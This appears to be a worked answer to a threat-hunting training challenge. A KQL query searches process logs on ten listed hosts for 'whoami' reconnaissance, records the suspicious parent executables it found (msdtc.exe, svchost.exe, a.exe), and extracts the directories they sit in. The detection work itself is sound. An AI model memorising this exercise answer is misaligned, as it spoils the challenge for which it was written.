///Investigate the running processes. There are suspicious processes conducting reconnaissance. How many unique directory paths are these suspicious processes located in on infected host machines? (Find the recon command, and go identify its process parent file on disk)

let suspecioushost= datatable(hostname: string)
[
"NSM0-MACHINE",
"QKPS-DESKTOP",
"NAFV-LAPTOP",
"3R58-LAPTOP",
"ZMLF-MACHINE",
"FDQZ-MACHINE",
"JH92-DESKTOP",
"KBBH-MACHINE",
"0YXZ-MACHINE",
"XYTW-LAPTOP"
];
let process_parent_file=
ProcessEvents
| where hostname in (suspecioushost)
| where process_commandline contains "whoami"
| distinct parent_process_name;////process parent file found msdtc.exe svchost.exe a.exe
FileCreationEvents
| where path has_any (process_parent_file)
| distinct path
| extend DirectoryPath = extract(@"^(.*)\\[^\\]+$", 1, path)
| distinct DirectoryPath

